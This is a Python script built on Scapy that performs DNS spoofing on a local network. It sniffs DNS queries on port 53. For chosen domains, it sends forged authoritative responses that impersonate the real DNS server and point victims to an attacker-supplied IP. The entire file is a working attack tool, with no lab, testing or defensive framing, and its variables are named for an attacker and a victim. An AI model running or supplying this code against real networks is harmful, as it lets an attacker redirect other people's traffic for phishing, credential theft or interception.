from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Ether, sendp  # Import Scapy layers
import logging  # Optional, used for debugging or logs

def spoof_dns_packet(pkt, spoofed_domains, fake_ip, attacker_mac, iface):
    # Check if it's a DNS query (qr == 0 means it's a query, not a response)
    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
        queried_domain = pkt[DNSQR].qname.decode().strip(".")  # Remove trailing dot
        victim_ip = pkt[IP].src  # Get the IP of the victim who made the request

        # If the queried domain is one of the spoofed targets
        if queried_domain in spoofed_domains:
            print("[+] Spoofing DNS response for {} → {}".format(queried_domain, fake_ip))

            # Build a forged DNS response
            ether = Ether(src=attacker_mac, dst=pkt[Ether].src)  # Ethernet header
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)  # IP header: source is the real DNS server
            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)  # UDP header with reversed ports
            dns = DNS(
                id=pkt[DNS].id,  # Use the same DNS transaction ID
                qr=1,  # This is a response
                aa=1,  # Authoritative answer
                qd=pkt[DNS].qd,  # Use original query
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=fake_ip)  # Spoofed answer
            )

            # Combine all layers into one packet
            spoofed_response = ether / ip / udp / dns

            # Send the forged DNS packet to the victim
            sendp(spoofed_response, iface=iface, verbose=False)

def start_dns_spoofer(spoofed_domains, fake_ip, attacker_mac, iface):
    # Starts the DNS sniffer on the given interface
    from scapy.all import sniff  # Import sniff only when needed

    print("[*] Starting DNS spoofing...")
    print("[*] Spoofed domains: {}".format(spoofed_domains))
    print("[*] Responding with fake IP: {}".format(fake_ip))

    try:
        # Sniff DNS requests and process each packet with spoof_dns_packet
        sniff(
            iface=iface,  # Interface to listen on
            filter="udp port 53",  # Only listen to DNS traffic
            prn=lambda pkt: spoof_dns_packet(pkt, spoofed_domains, fake_ip, attacker_mac, iface),  # Callback
            store=False  # Don't store packets in memory
        )
    except KeyboardInterrupt:
        print("\n[!] DNS spoofing stopped by user.")  # Graceful exit on Ctrl+C
